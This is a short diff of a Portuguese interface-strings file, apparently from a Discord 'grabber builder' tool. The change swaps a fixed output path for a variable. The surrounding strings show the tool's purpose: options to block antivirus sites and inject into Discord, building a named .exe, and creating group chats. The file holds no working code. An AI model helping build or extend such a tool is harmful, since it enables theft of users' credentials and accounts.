@@ -253,7 +253,7 @@ Bloquear Sites Antivírus (S/N)
 Injeção no Discord (S/N)
 Ícone do Arquivo
 Criando {name}.exe, Isso levará alguns segundos. Obrigado pela sua paciência!
-O Arquivo está em 'output/grabberbuilder/{name}.exe
+O Arquivo está em {path}
 Criado grupo de chat
 Taxa limitada ({response.json()['retry_after']}ms)
 Não há amigos suficientes disponíveis para seleção aleatória
